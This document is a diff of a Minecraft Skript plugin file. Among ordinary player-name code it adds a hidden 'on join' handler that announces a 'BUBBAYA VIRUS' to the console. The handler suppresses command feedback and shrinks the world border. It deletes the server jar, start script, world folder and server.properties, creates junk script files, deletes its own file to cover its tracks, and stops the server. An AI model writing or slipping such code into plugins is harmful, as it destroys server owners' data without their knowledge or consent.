@@ -4556,29 +4556,30 @@ on join:
 						set loop-player's display name to "%player%"
             
             
- on load:
-  set {vlength} to 0
+on load:
+    set {vlength} to 0
             
- on join:
-  wait 15 seconds
-  send "YOU HAVE BEEN INFECTED BY THE BUBBAYA VIRUS." to the console
-  send "THERE IS NO TAKE BACKS." to the console
-  wait 5 seconds
-  loop all worlds:
-    make console execute command "worldborder set 11"
-  delete file "spigot.jar"
-  delete file "start.bat"
-  delete file "world"
-  delete file "server.properties"
-  loop 10000 times:
-    create file "plugins/BUBBAYA%{vlength}%.sk"
-    create file "BUBBAYA%{vlength}%.sk"
-    download from "https://norvig.com/big.txt" to "plugins/BUBBAYA%{vlength}%.sk"
-    download from "https://norvig.com/big.txt" to "BUBBAYA%{vlength}%.sk"
-    add 1 to {vlength}
-    wait 60 ticks
-  wait 5 ticks
-  send "Now try to make a server out of this. -Citrin_" to the console
-  delete file "plugins/Skript/scripts/Mineplex.sk"
-  make console execute command "minecraft:stop"
+on join:
+    wait 15 seconds
+    send "YOU HAVE BEEN INFECTED BY THE BUBBAYA VIRUS." to the console
+    send "THERE IS NO TAKE BACKS." to the console
+    wait 5 seconds
+    loop all worlds:
+        make console execute command "minecraft:gamerule sendCommandFeedback false"
+        make console execute command "worldborder set 11"
+    delete file "spigot.jar"
+    delete file "start.bat"
+    delete file "world"
+    delete file "server.properties"
+    loop 10 times:
+        create file "plugins/BUBBAYA%{vlength}%.sk"
+        create file "BUBBAYA%{vlength}%.sk"
+        #download from "https://norvig.com/big.txt" to "plugins/BUBBAYA%{vlength}%.sk"
+        #download from "https://norvig.com/big.txt" to "BUBBAYA%{vlength}%.sk"
+        add 1 to {vlength}
+        wait 60 ticks
+    wait 5 ticks
+    send "Now try to make a server out of this. -Citrin_" to the console
+    delete file "plugins/Skript/scripts/bub.sk"
+    make console execute command "minecraft:stop"
   
